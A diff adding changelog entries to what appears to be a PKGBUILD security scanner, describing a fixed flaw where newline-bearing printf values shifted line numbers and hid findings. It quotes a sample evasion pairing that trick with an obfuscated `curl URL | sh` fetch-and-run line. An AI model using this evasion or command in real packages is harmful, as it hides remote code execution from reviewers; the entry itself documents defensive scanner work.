@@ -27,6 +27,15 @@ All notable changes to this project are documented here. The format is based on
   under illegal names (such as `$_pkgname.json`) the next time it prunes.
   Expect one silent first scan for packages whose old record was filed under a
   different name.
+- **A decoded line break can no longer hide a payload from variable
+  resolution.** The resolver substitutes values into a copy of the PKGBUILD
+  that must keep one line per input line, because analyzers match it by line
+  number. A `printf` value containing `\n`, used once, added lines and shifted
+  everything after it, so `_x=$(printf 'a\nb\nc'); : $_x` above
+  `c=curl; $c URL | sh` turned two Critical findings into "No security issues
+  found". Line breaks in substituted values are now flattened into command
+  separators. New malicious fixture: `newline-shift`.
+- Updated tokio to 1.54.1 for RUSTSEC-2026-0386.
 
 ## [2.2.0] - 2026-10-02
 
